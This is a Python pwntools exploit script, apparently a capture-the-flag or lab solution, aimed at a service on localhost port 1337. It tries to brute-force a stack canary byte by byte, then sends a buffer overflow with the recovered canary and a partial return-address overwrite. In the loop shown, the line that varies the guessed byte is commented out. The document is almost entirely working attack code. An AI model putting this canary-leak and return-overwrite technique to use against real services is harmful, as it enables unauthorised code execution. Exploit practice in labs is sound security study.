
from pwn import *
buffer_size = 72
payload_size = 80
canary_byte = 0
while(1):
    r = remote('127.0.0.1', 1337)
    out = r.recvuntil(b"size:")
    print(out.decode('utf-8', errors='ignore'))

    r.sendline(b"%d" % payload_size) 
    out = r.recvuntil(b"bytes)!")
    print(out.decode('utf-8', errors='ignore'))

    payload = b'\x00'*buffer_size
    payload += b'\x00'
    payload += b'\x0f'
    payload += b'\xd2'
    payload += b'\x6e'
    payload += b'\x91'
    payload += b'\x98'
    payload += b'\x31'
    payload += b'\x0e'
    #payload += bytes([canary_byte])
    r.send(payload)

    for j in range(42):
        print(r.recvline())
    status = r.recvline()
    if status == b'*** stack smashing detected ***: terminated\n':
        print("Stack smashing detected!")
    elif status == b'### Goodbye!\n':
        print("Leaked byte:",canary_byte)  
        break
    canary_byte += 1
    if canary_byte == 256:
        print("Leak not found",hex(canary_byte)) 
        break
# Above code to leak the canary byte by byte
# and then send the payload

payload_size = 90
r = remote('127.0.0.1', 1337)
out = r.recvuntil(b"size:")
print(out.decode('utf-8', errors='ignore'))

r.sendline(b"%d" % payload_size) 
out = r.recvuntil(b"bytes)!")
print(out.decode('utf-8', errors='ignore'))

payload = b'\x00'*72
payload += b'\x00'
payload += b'\x0f'
payload += b'\xd2'
payload += b'\x6e'
payload += b'\x91'
payload += b'\x98'
payload += b'\x31'
payload += b'\x0e'
payload += b"A"*8
payload += b'\xc8\x6d'
r.send(payload)

for j in range(600):
    print(r.recvline())
    
#     1dc8:       be 00 00 00 00          mov    esi,0x0
